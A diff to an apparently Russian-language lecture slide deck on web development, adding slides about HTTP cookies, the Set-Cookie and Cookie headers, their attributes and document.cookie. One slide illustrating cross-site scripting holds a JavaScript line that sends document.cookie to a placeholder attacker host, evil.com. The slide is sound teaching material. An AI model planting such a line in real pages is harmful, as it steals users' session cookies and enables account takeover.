@@ -610,6 +610,12 @@
 </section>
 
 
+<section class="slide question">
+	<h2>Практика!</h2>
+</section>
+
+
+
 <section class="slide">
 	<h2 class="shout">Работа с сетью</h2>
 </section>
@@ -750,6 +756,142 @@
 		<li><code>loadend</code> &mdash; запрос был прекращён по таймауту</li>
 		<li><code>readystatechange</code> &mdash; запрос был завершён (успешно или неуспешно)</li>
 	</ul>
+</section>
+
+
+<section class="slide">
+	<h2 class="shout">Cookies</h2>
+</section>
+
+<section class="slide question">
+	<h2>HTTP is a stateless protocol</h2>
+</section>
+
+<section class="slide">
+	<h2>Cookies</h2>
+	<div>
+		<blockquote>
+			<p class="small-content"><b>Куки (cookies)</b> &mdash; небольшой фрагмент данных, отправленный веб-сервером и хранимый на компьютере пользователя. Веб-клиент (обычно веб-браузер) всякий раз при попытке открыть страницу соответствующего сайта пересылает этот фрагмент данных веб-серверу в виде HTTP-запроса</p>
+		</blockquote>
+	</div>
+</section>
+
+<section class="slide">
+	<h2><a href="http://tools.ietf.org/html/rfc2965">Спецификация</a> cookies</h2>
+	<p class="small-content"></p>
+	<ul lang="ru">
+		<li>Браузер должен хранить как минимум 4096 байт кук</li>
+		<li>Минимум 20 шт. на домен</li>
+		<li>Минимум 300 шт. всего</li>
+		<li>Имена <mark>нечувствительны</mark> к регистру</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>1 Клиент → Сервер</h2>
+	<pre class="hljs http">
+			<code>GET / HTTP/1.1</code>
+			<code>Host: example.com</code>
+			<code> </code>
+		</pre>
+</section>
+
+<section class="slide">
+	<h2>2 Клиент ← Сервер</h2>
+	<pre class="hljs http">
+			<code>HTTP/1.1 200 OK</code>
+			<code><mark>Set-Cookie: name=value</mark></code>
+			<code>Content-Type: text/html</code>
+			<code> </code>
+		</pre>
+</section>
+
+<section class="slide">
+	<h2>3 Клиент → Сервер</h2>
+	<pre class="hljs http">
+			<code>GET / HTTP/1.1</code>
+			<code>Host: example.com</code>
+			<code><mark>Cookie: name=value</mark></code>
+			<code> </code>
+		</pre>
+</section>
+
+<section class="slide">
+	<h2>4 Клиент ← Сервер</h2>
+	<pre class="hljs http">
+			<code>HTTP/1.1 200 OK</code>
+			<code><mark>Set-Cookie: name=value2</mark></code>
+			<code>Content-Type: text/html</code>
+			<code> </code>
+		</pre>
+</section>
+
+<section class="slide">
+	<h2>Использование</h2>
+	<p class="small-content"></p>
+	<ul lang="ru">
+		<li>Аутентификация пользователей</li>
+		<li>Хранение настроек пользователей</li>
+		<li>Отслеживание сеанса (сессия)</li>
+		<li>Сбор статистики</li>
+		<li>Проведение экспериментов</li>
+		<li>etc...</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>Set-Cookie</h2>
+	<pre class="hljs http">
+		<code>Set-Cookie: value</code>
+		<code>                 [;<span hidden>X:</span> Expires=date]</code>
+		<code>                 [;<span hidden>X:</span> Max-Age=age]</code>
+		<code>                 [;<span hidden>X:</span> Domain=domain]</code>
+		<code>                 [;<span hidden>X:</span> Path=path]</code>
+		<code>                 [;<span hidden>X:</span> Secure]</code>
+		<code>                 [;<span hidden>X:</span> HttpOnly]</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Cookie ID</h2>
+	<pre class="hljs http">
+		<code>Set-Cookie: name=v1; domain=.example.com; path=/</code>
+		<code>Set-Cookie: name=v2; domain=www.example.com; path=/</code>
+		<code>Set-Cookie: name=v3; domain=.example.com; path=/archive</code>
+		<code> </code>
+	</pre>
+	<pre class="hljs http">
+		<code>Cookie: name=v1; name=v2; name=v3</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>JavaScript</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
+		<code>document.cookie; /* 'name1=value1' */</code>
+		<code class="next">document.cookie = 'name2=value2';</code>
+		<code class="next">document.cookie; /* 'name1=value1; name2=value2' */</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
+		<code>(new Image()).src = 'http://evil.com/?cookie=' +</code>
+		<code>                    document.cookie;</code>
+	</pre>
+</section>
+
+
+
+
+<section class="slide question">
+	<h2>Практика!</h2>
 </section>
 
 
